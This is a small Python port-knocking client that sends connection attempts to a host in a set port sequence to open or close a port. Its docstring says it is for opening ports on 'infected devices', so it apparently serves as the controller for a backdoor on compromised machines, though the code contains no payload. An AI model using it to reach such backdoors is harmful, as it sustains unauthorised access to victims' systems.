"""
    This script is for opening the ports on the infected devices.
    This script would not be installed on the server.
    
    Autheur: Jorick van Brunschot.
"""
VERSION = 1.0
openPort = [1337,3141,7337]
closePort = [3141,7337,1337]

import argparse
import os, sys
import socket

def knock(host, ports):
    failed = 0
    for port in ports:
        try:
            port = int(port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))
            s.close()
            print ("knock knock knock" , port)
        except socket.error:
            failed = 1
            print("Port " , port ,"knock failed")

    if failed == 0:
        print("Sequence knocked successfully.")
    else:
        sys.exit("Knock sequence failed.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-V", "--version", help="Show program version", action="store_true")
    parser.add_argument("-O", "--open", help="Open host port", action="store_true")
    parser.add_argument("-C", "--close", help="Open host port", action="store_true")
    parser.add_argument("-H", "--host", help="Goal host")
    parser.add_argument("-P", "--ports", help="Optional - available knocking ports. Default is for opening 1337,3141,7337 and closing 3141,7337,1337. seperated by commas without spaces.")
    args = parser.parse_args()

    if args.version:
        sys.exit("Version: {}".format(VERSION))

    if args.open and args.close:
        sys.exit("You can only close or open. Not both.")

    if not args.open and not args.close:
        sys.exit("Please tell me to open or close.")

    if not args.host:
        sys.exit("We need a host to knock.")

    if args.open:
        if args.ports:
            openPort = args.ports.split(",")
        knock(args.host, openPort)
        print ("Dont forget to close it again!")

    elif args.close:
        if args.ports:
            closePort = args.ports.split(",")
        knock(args.host, closePort)
